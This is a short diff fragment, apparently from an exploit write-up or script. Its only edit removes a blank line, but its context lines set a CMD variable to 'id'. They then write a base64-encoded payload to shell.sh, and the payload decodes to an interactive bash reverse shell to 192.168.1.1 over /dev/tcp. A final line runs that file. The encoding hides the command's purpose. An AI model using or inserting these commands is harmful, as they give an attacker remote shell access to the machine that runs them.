@@ -51,4 +51,3 @@ CMD = "id"
 CMD="echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS4xLzgwIDA+JjE= | base64 -d > shell.sh"
 CMD="bash shell.sh"
 ```
-
